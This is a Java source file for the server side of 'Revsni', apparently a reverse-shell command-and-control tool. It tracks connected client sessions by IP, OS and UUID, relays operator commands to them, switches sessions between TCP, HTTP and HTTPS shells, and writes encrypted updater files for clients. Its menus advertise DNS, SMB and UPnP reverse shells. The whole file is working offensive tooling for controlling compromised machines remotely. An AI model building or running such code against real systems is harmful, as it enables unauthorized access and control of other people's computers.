package com.revsni.server;


import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import java.util.Map.Entry;
import java.util.concurrent.ConcurrentHashMap;

import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

import com.revsni.Revsni;
import com.revsni.server.encryption.RSA;
import com.revsni.common.Configuration;
import com.revsni.common.Sessionerino;
import com.revsni.common.Configuration.EncMode;
import com.revsni.common.Configuration.Mode;
import com.revsni.server.encryption.AES;
//import com.revsni.server.encryption.AES;
import com.revsni.server.encryption.Encri;
import com.revsni.server.http.HTTPShell;
import com.revsni.server.https.HTTPSShell;
import com.revsni.server.tcp.Handler;
import com.revsni.server.tcp.Listener;
import com.revsni.utils.CouplePair;
import com.revsni.utils.ThreadMonitor;
import com.revsni.utils.Triplet;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.passay.CharacterRule;
import org.passay.EnglishCharacterData;
import org.passay.CharacterData;
import org.passay.PasswordGenerator;

import com.fasterxml.jackson.annotation.PropertyAccessor;
import com.fasterxml.jackson.annotation.JsonAutoDetect.Visibility;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;



public class Server implements Runnable{
    //Shell and Network stuff
    
    private volatile boolean running;
    private volatile int port;
    //private volatile int portIn;
    private volatile SecretKey key;
    private volatile IvParameterSpec iv;
    //private Configuration configuration;
    private volatile boolean first = true;
    private volatile boolean firstOp = true;
    private volatile Updater updater;
    private volatile HTTPShell httpShell;
    private volatile HTTPSShell httpsShell;
    private volatile Listener listener;
    public volatile ThreadMonitor threadMonitor;
    public volatile Protocol protocol;

    //Sessions
    public volatile int sessionNumber;
    public volatile int sessionNumberStart;
    //public volatile ArrayList<Triplet<Mode, Integer, String>> modePortUUID = new ArrayList<>();
    //public volatile ArrayList<CouplePair<String, String>> ipOs = new ArrayList<>();
    public volatile ConcurrentHashMap<Integer, Interaction> sessionHandlers = new ConcurrentHashMap<>();

    public volatile HashMap<Integer, Triplet<Mode, Integer, String>> modePortUUID = new HashMap<>();
    public volatile HashMap<Integer, CouplePair<String, String>> ipOs = new HashMap<>();
    public volatile HashMap<Integer, String> ips = new HashMap<>();

    //Helper Lists and Maps for Sessions
    //public volatile ArrayList<String> ips = new ArrayList<>();
    public static HashMap<Integer, String> sessionNumOsStatic = new HashMap<>();
    public HashMap<Integer, String> sessionNumOs = sessionNumOsStatic;
    public static HashMap<Integer, String> sessNumUUIDSatic = new HashMap<>();
    public HashMap<Integer, String> sessNumUUID = sessNumUUIDSatic;
    public static HashMap<Integer, String> sessIpSt = new HashMap<>();
    public HashMap<Integer, String> sessIp = sessIpSt;

    public static HashMap<Integer, Encri> clientEnc = new HashMap<>();

    public static Encri initEncri;

    public static Configuration configserv;


    Logger logger = LogManager.getLogger(getClass());
    private static final Logger loggerS = LogManager.getLogger(Server.class);



    public Server(String pass, String salt, ThreadMonitor monitor, int sessionNumber, boolean loaded, Configuration configuration) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
        this.sessionNumber = sessionNumber;
        this.sessionNumberStart = sessionNumber;
        configserv = configuration;
        EncMode initEncMode = configuration.getEncMode();
        switch (initEncMode.name()) {
            case ("RSA") -> initEncri = new RSA(/* Add configuration stuff */);
            case ("AES") -> initEncri = new AES(configuration.getEncMode().pass, configuration.getEncMode().salt);
        }

        
        this.threadMonitor = monitor;

        String ip = configuration.getMode().lHost;
        int port = configuration.getMode().lPort;

        if(!loaded) {
            initServer(ip, port, pass, salt);
        } else {
            first = false;
        }
        
    }

    public void initServer(String ip, int port, String password, String saltForPass) {
        this.port = port;

        updater = new Updater(ip, port, initEncri, configserv);

        try {
            updater.generateOutputString(configserv.getEncMode());
            if(updater.writeOut("initialRSA")) {
                logger.debug("File initialRSA wrote!");
            } else {
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    //Creates Initial Listener on TCP and handles Console Input from User as well as the interaction with different Types of Shells like TCP, HTTP etc.
    @Override
    public void run() {
        if(!isRunning() && first) {
            listener = new Listener(this, sessionNumber);
            Thread listenerThread = new Thread(listener);
            listenerThread.start();
        }
        while(isRunning()) {
            try {
                String message = "";
                do {
                    try {
                        if(firstOp) { System.out.println("Listener started!"); logger.info("Enter 'help' if you dont know what to do.\n\nListening...\n");}
                        firstOp = false;

                        InputStreamReader inputStreamReader = new InputStreamReader(System.in);
                        BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                        
                        if(sessionHandlers.keySet().isEmpty()) { sessionNumber = 0; }
                        printIn(sessionNumber);
                        message = bufferedReader.readLine();

                        switch(message) {
                            case("help"): printHelp(); break;
                            case("usage"): printUsage(); break;
                            case("configure"): printConfigure(); break;
                            case("switch"):
                                if(sessionNumber == 0) {  logger.error("No clients connected for switch!\n"); break; } 
                                printSwitch();
                                System.out.println("---Enter anything else to leave this menu.---\n");
                                printIn(sessionNumber);
                                String tmp = bufferedReader.readLine();
                                switch(tmp) {
                                    case("tcp"):
                                        System.out.print("Specify a Port on which TCP Listener should listen on (empty for std server port ("+Configuration.localPortTCP+")): ");
                                        String port = bufferedReader.readLine();
                                        //logger.info("Value: " + port);
                                        //logger.info("Value 1331: " + String.valueOf(Configuration.localPortTCP));
                                        switchTCP(port);
                                        break;

                                    case("http"): 
                                        System.out.print("Specify a Port on which HTTP-Server should listen on: ");
                                        int portHttp = Integer.parseInt(bufferedReader.readLine());
                                        httpShell = new HTTPShell(portHttp, sessionNumber, protocol);
                                        updater.setShellType("HTTP", getIp(sessionNumber), String.valueOf(httpShell.getPort()));
                                        updater.generateOutputString(clientEnc.get(sessionNumber).getEncryption());
                                        updater.writeOut(getUUID(sessionNumber));
                                        senderino("httpSw", sessionNumber);
                                        setInteraction(sessionNumber, httpShell);
                                        setMode(sessionNumber, Mode.HTTP);
                                        logger.info("Switch done!");
                                        break;

                                    case("https"): 
                                        System.out.print("Specify a Port on which HTTPS-Server should listen on: ");
                                        int portIn = Integer.parseInt(bufferedReader.readLine());
                                        httpsShell = new HTTPSShell(key, iv, portIn);
                                        httpsShell.fireUp(portIn);
                                        updater.setShellType("HTTPS", getIp(sessionNumber), String.valueOf(getInteraction(sessionNumber).getPort()));
                                        updater.generateOutputString(clientEnc.get(sessionNumber).getEncryption());
                                        updater.writeOut(getUUID(sessionNumber));
                                        senderino("httpsSw", sessionNumber);
                                        setInteraction(sessionNumber, httpsShell);
                                        setMode(sessionNumber, Mode.HTTPS);
                                        break;
                                
                                    default:
                                        break;
                                } 
                                break;
                            case("mode"): printMode(); break;
                            case("kill"): if(sessionNumber == 0) { break; } getInteraction(sessionNumber).sendCommand("kill"); getInteraction(sessionNumber).sendCommand("exit"); break;
                            case("remove"): removeSession(sessionNumber); sessionNumber = 0; break;
                            case("exit"): closeRoutine(); return;
                            case("encryption"): printEncryption(); break;
                            case("bg"):
                                Revsni.setActiveHelper(true); 
                                synchronized(threadMonitor) {
                                    try {
                                        threadMonitor.wait();
                                    } catch(InterruptedException e) {

                                    }
                                }
                                break;  
                                
                            case("sessions"):
                                printSessions();

                                System.out.print("Which session you want to interact with? (type 'none' to exit): ");
                                String decis = bufferedReader.readLine();
                                if(!decis.equals("none")) {
                                    sessionNumber = Integer.parseInt(decis);
                                }
                                message = "sessions";
                                break;
                                
                            default:
                                if(!(message.equals("sessions") || message.equals("mode") || message.equals("encryption") || message.equals("switch") || sessionNumber == 0)) {
                                    if(checkIfOnline(sessionNumber)) {
                                        if(getMode(sessionNumber).toString().equals("TCP")) {
                                            //logger.info("Message: " + message);
                                            senderino(message, sessionNumber);
                                            
                                        }
                                        if(getMode(sessionNumber).toString().equals("HTTP")) {
                                            senderino(message, sessionNumber);
                                            //sessionHandlers.get(sessionNumber).sendCommand(message);
                                        }
                                        if(getMode(sessionNumber).toString().equals("HTTPS")) {
                                            senderino(message, sessionNumber);
                                            //sessionHandlers.get(sessionNumber).sendCommand(message);
                                        }
                                    }
                                } else {
                                }
                                if(sessionNumber == 0) { logger.error("No client selected or no clients are connected! Check with entering 'sessions'."); }
                            }
                    } catch(IOException e) {
                        logger.error(e.getMessage() +": occured in Server main Thread!");
                        closeRoutine();
                        return;
                    }
                } while(!message.equals("quit"));
                logger.info("lul");
            } finally {
                logger.info("Server is shutting down");
                closeRoutine();
            }
            return;
        }
    }

    public void send(int sessionNumber, String message) {
        if(checkIfOnline(sessionNumber)) {
            getInteraction(sessionNumber).sendCommand(message);
        } else {
            logger.info("Session: + " + sessionNumber + " went offline due to unknown fkin reasons.");
        }
    }

    public void senderino(String message, int sessionNumber) {
        try {
            send(sessionNumber, message, sessNumUUID.get(sessionNumber));
        } catch(Exception e) {
            e.printStackTrace();
            logger.error("Failed to send command: '"+message+"'!");
            
            if(sessionHandlers.keySet().isEmpty()) {
                logger.error("No clients are connected!");
                sessionNumber = 0;
                                  
            }
        }
    }

    public void closeRoutine() {
        listener.stopListening();
        setRunning(false);
        Revsni.setActive(false); 
        Revsni.setServerError();
        Revsni.setActiveHelper(true); 
    }

    public void send(int sessionNumber, String message, String uuid) {
        if(checkIfOnline(sessionNumber)) {
            getInteraction(sessionNumber).sendCommand(message, uuid);
        } else {
            logger.info("Session: " + sessionNumber + " went offline due to unknown fkin reasons.");
        }
    }

    public boolean checkIfOnline(int sessionNumber) {
        Boolean ret = false;
        try {
            if(modePortUUID.get(sessionNumber).getKey().name().equals("HTTP")) { return true; }
            Handler handler = (Handler) sessionHandlers.get(sessionNumber);
            ret = handler.checkIfOnline();
            return ret;
        } catch (NullPointerException e) {
            return false;
        }
    }



    //Pass and Salt gen
    public static String generatePassOrSalt() {
        PasswordGenerator gen = new PasswordGenerator();
        CharacterData lowerCaseChars = EnglishCharacterData.LowerCase;
        CharacterRule lowerCaseRule = new CharacterRule(lowerCaseChars);
        lowerCaseRule.setNumberOfCharacters(2);
    
        CharacterData upperCaseChars = EnglishCharacterData.UpperCase;
        CharacterRule upperCaseRule = new CharacterRule(upperCaseChars);
        upperCaseRule.setNumberOfCharacters(2);
    
        CharacterData digitChars = EnglishCharacterData.Digit;
        CharacterRule digitRule = new CharacterRule(digitChars);
        digitRule.setNumberOfCharacters(2);
        
        CharacterData specialChars = new org.passay.CharacterData() {
            public String getErrorCode() {
                return "Error while generating special chars for pass/salt!";
            }
    
            public String getCharacters() {
                return "!@#$%^&*()_+";
            }
        };
        CharacterRule splCharRule = new CharacterRule(specialChars);
        splCharRule.setNumberOfCharacters(2);
    
        String password = gen.generatePassword(10, splCharRule, lowerCaseRule, upperCaseRule, digitRule);
        return password;
    }

    //Getter and Setter

    public synchronized boolean isRunning() {
        return running;
    }

    public synchronized void setRunning(boolean running) {
        this.running = running;
    }

    public synchronized int getPort() {
        return this.port;
    }

    public void setPort(int port) {
        this.port = port;
    }
    public SecretKey getKey() {
        return this.key;
    }
    public IvParameterSpec getIv() {
        return this.iv;
    }

    public void setConfig(Configuration config) {
        //this.configuration = config;

        //Implement applying config to TCP, HTTP, HTTPS and stuff.
    }

    public void switchTCP(String port) {
        if(port.equals("")) { port = String.valueOf(Configuration.localPortTCP); }
        updater.setShellType(Mode.TCP.name(), Configuration.localAddrTCP, port);
        try {
            updater.generateOutputString(clientEnc.get(sessionNumber).getEncryption());
            updater.writeOut(getUUID(sessionNumber));
        } catch (IOException e) {
            logger.error("Failed to write Updater file!");
        }
        senderino("tcpSw", sessionNumber);
        //TODO: set Interaction for switch.
        //setInteraction(sessionNumber, get);
        logger.info("Switch done!");
    }



    //Session handling

    public static void addSession(String uuid, String os, int sessionNumber) {
        loggerS.info("\nAdded Session Nr. " + sessionNumber + " to the session list!\n");
        sessionNumOsStatic.put(sessionNumber, os);
        sessNumUUIDSatic.put(sessionNumber, uuid);
 
    }

    public void addSession(String ip, int port, Interaction handler, int sessionNumber ) {
        sessionHandlers.put(sessionNumber, handler);
        sessIpSt.put(sessionNumber, ip);
        setNewEncryption(configserv.getEncMode(), sessionNumber);
        
        //handlerinos.put(sessionNumber, handler);
    }

    public void removeSession(int sessionNumber) {
        updateSessionInfo();
        sessionHandlers.remove(sessionNumber);
        modePortUUID.remove(sessionNumber);
        ipOs.remove(sessionNumber);
    }

    public Interaction getInteraction(int sessionNumber) {
        //logger.info("Getting interaction for sessioNumber: " + sessionNumber);
        //logger.info("Type is: " + sessionHandlers.get(sessionNumber).getMode().toString());
        Interaction ret = null;
        try {
            ret = sessionHandlers.get(sessionNumber);
        } catch(NullPointerException e) {
            logger.error("Cannot find Session, session will close!");
            ret = null;
        }
        return ret;
    }

    public String getIp(int sessioNumber) {
        return sessIp.get(sessioNumber);
    }

    public String getUUID(int sessionNumber) {
        return modePortUUID.get(sessionNumber).getAddition();
    }

    public Mode getMode(int sessionNumber) {
        Mode ret = null;
        int sess = sessionNumber;
        try {
            ret = modePortUUID.get(sess).getKey();
        } catch(IndexOutOfBoundsException | NullPointerException e) {
            return Mode.TCP;
        }

        return ret;
    }

    public void setMode(int sessionNumber, Mode mode) {
        int sess = sessionNumber;
        Triplet<Mode, Integer, String> trip = new Triplet<Configuration.Mode,Integer,String>(mode, modePortUUID.get(sess).getValue(), modePortUUID.get(sess).getAddition());
        modePortUUID.put(sess, trip);
    }

    public void addToPrint(int sessNr) {
        String tmpIp = getIp(sessNr);
        int tmpPort = getInteraction(sessNr).getPort();
        Mode tmpMode = getInteraction(sessNr).getMode();
        String tmpUUID = sessNumUUID.get(sessNr);
        String tmpOs = sessionNumOs.get(sessNr);

        ipOs.put(sessNr, new CouplePair<String,String>(tmpIp, tmpOs));
        modePortUUID.put(sessNr, new Triplet<Mode, Integer, String>(tmpMode, tmpPort, tmpUUID));
        updateSessionInfo();
        printIn(sessNr);
    }

    public void setInteraction(int sessioNumber, Interaction interaction) {
        if(sessionHandlers.get(sessioNumber) == null) {
            sessionHandlers.put(sessioNumber, interaction);
        }
        sessionHandlers.replace(sessioNumber, interaction);
    }

    public void printIn(int sessionNumber) {
        if(getMode(sessionNumber) != Mode.HTTP) {
            try {
                System.out.print("Revsn [" + getMode(sessionNumber).toString() + "]["+ getIp(sessionNumber) +"]["+sessionNumber+"]» ");
            } catch(Exception e) {
                System.out.print("Revsn [None][None][None]» ");
            }
        } 
        
        
    }


    public void printSessions() {
        try {
            System.out.println("---|Session List|---\n|Session Nr.\t|IP\t\t|OS\t|Mode\t|UUID\t\t\t\t\t|");
            for(Integer sess : ipOs.keySet()) {
                System.out.println(
                    "|" + sess + "\t\t" +
                    "|" + ipOs.get(sess).getKey() + "\t" +
                    "|" + ipOs.get(sess).getValue() + "\t" +
                    "|" + modePortUUID.get(sess).getKey() + "\t" +
                    "|" + modePortUUID.get(sess).getAddition() + "\t" +
                    "|\n");
            }
        } catch(IndexOutOfBoundsException | NullPointerException e) {
        }
    }

    public void saveSessions(String filename) {
        ObjectMapper mapperino = new ObjectMapper();
        File sessionFile = new File(filename + ".json");
        mapperino.setVisibility(PropertyAccessor.FIELD, Visibility.ANY);
        mapperino.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
        Sessionerino sessionerino = new Sessionerino(sessionNumberStart, modePortUUID, ipOs, null);
        try {
            mapperino.writeValue(sessionFile, sessionerino);
            System.out.println("Successfully saved sessions to: '"+filename+".json'!");
        } catch(IOException e) {
            e.printStackTrace();
            logger.error("FAILED TO SAVE SESSIONS TO FILE!");
        }
    }
    public void saveSessions() {
        ObjectMapper mapperino = new ObjectMapper();
        File sessionFile = new File("sessions.json");
        mapperino.setVisibility(PropertyAccessor.FIELD, Visibility.ANY);
        mapperino.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
        Sessionerino sessionerino = new Sessionerino(sessionNumberStart, modePortUUID, ipOs, null);
        try {
            mapperino.writeValue(sessionFile, sessionerino);
            System.out.println("Successfully saved sessions to 'sessions.json'!");
        } catch(IOException e) {
            e.printStackTrace();
            logger.error("FAILED TO SAVE SESSIONS TO FILE!");
        }
    }

    public boolean loadSessions(String filename) {
        ObjectMapper mapperino = new ObjectMapper();
        mapperino.setVisibility(PropertyAccessor.FIELD, Visibility.ANY);
        File sessionFile = new File(filename + ".json");
        try {
            Sessionerino sessionerino = mapperino.readValue(sessionFile, Sessionerino.class);
            sessionNumberStart = sessionerino.getSessionNumberStart();
            modePortUUID = sessionerino.getModePortUUID();
            ipOs = sessionerino.getIpOs();
            System.out.println("Successfully loaded sessions from: '"+filename+".json'!");
            return true;
        } catch(IOException e) {
            e.printStackTrace();
            logger.error("FAILED TO LOAD SESSIONS FROM FILE!");
            return false;
        }
    }
    public boolean loadSessions() {
        ObjectMapper mapperino = new ObjectMapper();
        mapperino.setVisibility(PropertyAccessor.FIELD, Visibility.ANY);
        File sessionFile = new File("sessions.json");
        try {
            Sessionerino sessionerino = mapperino.readValue(sessionFile, Sessionerino.class);
            sessionNumberStart = sessionerino.getSessionNumberStart();
            modePortUUID = sessionerino.getModePortUUID();
            ipOs = sessionerino.getIpOs();
            System.out.println("Successfully loaded sessions from: 'sessions.json'!");
            return true;
        } catch(IOException e) {
            e.printStackTrace();
            logger.error("FAILED TO LOAD SESSIONS FROM FILE!");
            return false;
        }
    }

    public void updateLoadedSessionsForHandlers(String uuid, Interaction interaction) {
        for(Triplet<Mode, Integer, String> tip : modePortUUID.values()) {
            if(tip.getAddition().equals(uuid)) {
                int sessId = getKeyByValue(modePortUUID, tip);
                sessionHandlers.replace(sessId, interaction);
            }
        }
    }

    public void updateSessionInfo() {
        int count = 0;
        for(String uuid : sessNumUUID.values()) {
            for(String uuid2 : sessNumUUID.values()) {
                if(uuid.equals(uuid2)) {
                    count++;
                    if(count > 2) {
                        int sessNum = getKeyByValue(sessNumUUID, uuid);
                        try {
                            if(getInteraction(sessNum) instanceof HTTPShell) {
                                getInteraction(sessNum).shutdown();
                            }
                            logger.info("Duplicate session + " + uuid + " removed.");
                        } catch (Exception e) {
                            logger.error("Failed to shutdown listening instance for session nr. " + sessNum + "\n");
                        }
                        removeSession(sessNum); 
                    }
                }
            }
            count = 0;
        }
    }

    public void setNewEncryption(EncMode mode, int sessionNumber) {
        switch(mode) {
            case AES:
                clientEnc.put(sessionNumber, updater.getInitEnc());
                break;
            case BLOWFISH: break;
            case SERPENT: break;
            case RSA: 
                clientEnc.put(sessionNumber, updater.getInitEnc());
                break;
            case TWOFISH: break;
            case SSL: break;
            case TRIPLE_DES: break;
            default:
                break;
        }
    }

    public static HashMap<Integer, Encri> getClientEncryptions() {
        return clientEnc;
    }

    
    public void deliverNewFile(int sessionNumber) {
        String uuid = sessNumUUIDSatic.get(sessionNumber);
        
        /* RSA */

        /*
        initEncri.generateClientKeyPair(uuid);
        try {
            updater.setPrivKey(initEncri.getClientPrivKey(uuid));
            updater.setPubKey(initEncri.getClientPubKey(uuid));
            updater.generateOutputString(configuration.getEncMode());
            updater.writeOut(uuid);
        } catch (IOException e) {
            e.printStackTrace();
        }
        */

        /* AES */
        try {
            updater.generateOutputString(configserv.getEncMode());
            updater.writeOut(uuid);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    


    //Useful

    public <T, E> T getKeyByValue(Map<T, E> map, E value) {
        for (Entry<T, E> entry : map.entrySet()) {
            if (Objects.equals(value, entry.getValue())) {
                return entry.getKey();
            }
        }
        return null;
    }

    public void setProtocol(Protocol prot) {
        this.protocol = prot;
    }

    public Configuration getConfiguration() {
        return configserv;
    }


    //Menus

    private void printHelp() {
        System.out.println("\n"
                          +"-----------"
                          +"|Help Menu|"
                          +"-----------"
                          +"\n"
                          +"mode        -   Use netcat for example\n"
                          +"commands    -   Show Revsn specific commands\n"
                          +"encryption  -   Change between different encryptions or combine them\n"
                          +"switch      -   Switch Shell\n"
                          +"configure   -   Configure Revsn\n"
                          +"bg          -   Background Session\n"
                          +"quit        -   Closes connection\n"
                          +"\n");
    }

    private void printMode() {
        System.out.println("\n"
                          +"-----------"
                          +"|Mode Menu|"
                          +"-----------"
                          +"\n"
                          +"vanilla     -   Use Revsni Java Interface\n"
                          +"safe        -   Use predefined Commands\n"
                          +"nc          -   Use netcat\n"
                          +"ps          -   Use Powershell (Windows only!)\n"
                          +"\n");
    }

    private void printConfigure() {
        System.out.println("\n"
                          +"-----------"
                          +"|Configuration Menu|"
                          +"-----------"
                          +"\n"
                          +"charset     -   Configure used charset for compatibility\n"
                          +"shells      -   Configure Parameters of different Shells\n"
                          +"\n");
    }

    private void printSwitch() {
        System.out.println("\n"
                          +"-----------"
                          +"|Shell Menu|"
                          +"-----------"
                          +"\n"
                          +"tcp         -   Change to TCP Shell\n"
                          +"udp         -   Change to UDP Shell\n"
                          +"http        -   Change to HTTP Shell\n"
                          +"https       -   Change to HTTPS Shell\n"
                          +"httpas      -   Change to Asynchronous HTTP Shell\n"
                          +"httpsas     -   Change to Asynchronous HTTPS Shell\n"
                          +"dns         -   Change to DNS Reverse Shell\n"
                          +"smb         -   Change to SMB Shell (mostly Windows only, run detection first!)\n"
                          +"ssdp/upnp   -   Change to SSDP/UPNP Shell through UDP\n"
                          +"\n");
    }

    private void printEncryption() {
        System.out.println("\n"
                          +"-----------"
                          +"|Encryption Menu|"
                          +"-----------"
                          +"\n"
                          +"AES         -   AES in CBC mode\n"
                          +"RSA         -   Well, seems like RSA\n"
                          +"Triple DES  -   Used for example to encrypt UNIX password and ATM pins\n"
                          +"Blowfish    -   Blow da fish Kanye\n"
                          +"Twofish     -   u know Kanye\n"
                          +"Serpent     -   Is it a Python?!\n"
                          +"\n");
    }

    private static void printUsage() {
        System.out.println("\n"
                          +"-----------"
                          +"|Usage|"
                          +"-----------"
                          +"\n"
                          +"For now Revsni needs AES for initial connection\n you don't have to specify a password\n  nor a salt\n   but they will be generated and saved into a file called output.txt!\n"
                          +"\nMinimal:\n\tjava -jar server.jar <Server-IP> <Server-Port>\n"
                          +"\nRecommendend:\n\tjava -jar server.jar <Server-IP> <Server-Port> <Password> <Salt>\n"
                          +"\nIt's okay to not specify a salt as it will be generated anyways. :) \n"
                          +"\n");
    }

    /*
    private void printCommands() {

    }
    */

}
